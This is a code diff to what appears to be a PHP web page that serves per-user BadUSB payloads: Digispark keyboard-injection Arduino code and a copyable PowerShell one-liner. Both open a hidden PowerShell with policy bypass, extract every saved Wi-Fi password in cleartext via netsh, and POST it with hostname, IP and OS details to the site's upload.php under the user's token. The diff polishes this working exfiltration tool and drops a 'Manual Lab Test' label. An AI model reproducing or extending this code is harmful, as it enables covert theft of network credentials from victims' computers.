@@ -1017,23 +1017,13 @@ void loop() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(1000);
 
-  // Win + R (Run Dialog)
+  // Open Windows Run
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(600);
 
-  // Exfiltration command with your account token
-  DigiKeyboard.print("powershell -w hidden -ep bypass -nop -c \"");
-  DigiKeyboard.print("$t='<?php echo h($currentUser); ?>';");
-  DigiKeyboard.print("$u='http://<?php echo $_SERVER['HTTP_HOST']; ?>/upload.php?token='+$t;");
-  DigiKeyboard.print("$p=(netsh wlan show profiles)|Select-String ':(.+)$'|%{ $_.Matches.Groups[1].Value.Trim() };");
-  DigiKeyboard.print("foreach($s in $p){");
-  DigiKeyboard.print("$k=(netsh wlan show profile name=$s key=clear|Select-String 'Key Content\\\\s*:\\\\s*(.+)$').Matches.Groups[1].Value;");
-  DigiKeyboard.print("if(-not $k){$k='(Not Found)'};");
-  DigiKeyboard.print("$d=\\\"$(Get-Date -f 'yyyy-MM-dd HH:mm:ss'),$env:COMPUTERNAME,$s,$k,$((Get-NetIPAddress -AddressFamily IPv4).IPAddress[0]),$((Get-CimInstance Win32_OperatingSystem).Caption)\\\";");
-  DigiKeyboard.print("Invoke-RestMethod -Uri $u -Method POST -Body $d;");
-  DigiKeyboard.print("}\"");
-
-  DigiKeyboard.delay(300);
+  // Send clean PowerShell command
+  DigiKeyboard.print("powershell -w hidden -ep bypass -nop \"$t='<?php echo h($currentUser); ?>';$u='http://<?php echo $_SERVER['HTTP_HOST']; ?>/upload.php?token='+$t;(netsh wlan show profiles)|Select-String ':(.+)$'|%{ $s=$_.Matches.Groups[1].Value.Trim(); $k=((netsh wlan show profile name=$s key=clear)|Select-String 'Key Content\\\\s*:\\\\s*(.+)$').Matches.Groups[1].Value; if(-not $k){$k='(Not Found)'}; $ip=(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue|Where-Object {$_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*'}|Select-Object -ExpandProperty IPAddress -First 1); if(-not $ip){$ip='offline'}; $b=\\\"$(Get-Date -f 'yyyy-MM-dd HH:mm:ss'),$env:COMPUTERNAME,$s,$k,$ip,$((Get-CimInstance Win32_OperatingSystem).Caption)\\\"; Invoke-RestMethod -Uri $u -Method POST -Body $b }\"");
+  DigiKeyboard.delay(400);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   for(;;) { DigiKeyboard.delay(5000); }
@@ -1042,10 +1032,10 @@ void loop() {
 
       <div style="margin-bottom:18px;">
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
-          <span style="font-size:12px;font-weight:700;color:#64748b;text-transform:uppercase;">2. Instant PowerShell One-Liner (Manual Lab Test)</span>
+          <span style="font-size:12px;font-weight:700;color:#64748b;text-transform:uppercase;">2. Instant PowerShell One-Liner (Command Prompt / PowerShell)</span>
           <button type="button" onclick="copyCode('psOneLiner')" style="background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);color:#38bdf8;padding:4px 10px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;">📋 Copy PowerShell</button>
         </div>
-        <pre id="psOneLiner" style="font-family:'JetBrains Mono',monospace;font-size:12px;background:#020617;border:1px solid rgba(255,255,255,0.08);border-radius:10px;padding:12px;color:#38bdf8;overflow-x:auto;white-space:pre-wrap;">powershell -w hidden -ep bypass -nop -c "$t='<?php echo h($currentUser); ?>';$u='http://<?php echo $_SERVER['HTTP_HOST']; ?>/upload.php?token='+$t;(netsh wlan show profiles)|Select-String ':(.+)$'|%{ $_.Matches.Groups[1].Value.Trim() }|%{ $s=$_; $k=((netsh wlan show profile name=$s key=clear)|Select-String 'Key Content\s*:\s*(.+)$').Matches.Groups[1].Value; if(-not $k){$k='(Not Found)'}; Invoke-RestMethod -Uri $u -Method POST -Body \"$(Get-Date -f 'yyyy-MM-dd HH:mm:ss'),$env:COMPUTERNAME,$s,$k,$((Get-NetIPAddress -AddressFamily IPv4).IPAddress[0]),$((Get-CimInstance Win32_OperatingSystem).Caption)\" }"</pre>
+        <pre id="psOneLiner" style="font-family:'JetBrains Mono',monospace;font-size:12px;background:#020617;border:1px solid rgba(255,255,255,0.08);border-radius:10px;padding:12px;color:#38bdf8;overflow-x:auto;white-space:pre-wrap;">powershell -w hidden -ep bypass -nop "$t='<?php echo h($currentUser); ?>';$u='http://<?php echo $_SERVER['HTTP_HOST']; ?>/upload.php?token='+$t;(netsh wlan show profiles)|Select-String ':(.+)$'|%{ $s=$_.Matches.Groups[1].Value.Trim(); $k=((netsh wlan show profile name=$s key=clear)|Select-String 'Key Content\s*:\s*(.+)$').Matches.Groups[1].Value; if(-not $k){$k='(Not Found)'}; $ip=(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue|Where-Object {$_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*'}|Select-Object -ExpandProperty IPAddress -First 1); if(-not $ip){$ip='offline'}; $b=\"$(Get-Date -f 'yyyy-MM-dd HH:mm:ss'),$env:COMPUTERNAME,$s,$k,$ip,$((Get-CimInstance Win32_OperatingSystem).Caption)\"; Invoke-RestMethod -Uri $u -Method POST -Body $b }"</pre>
       </div>
 
       <div style="display:flex;justify-content:flex-end;">
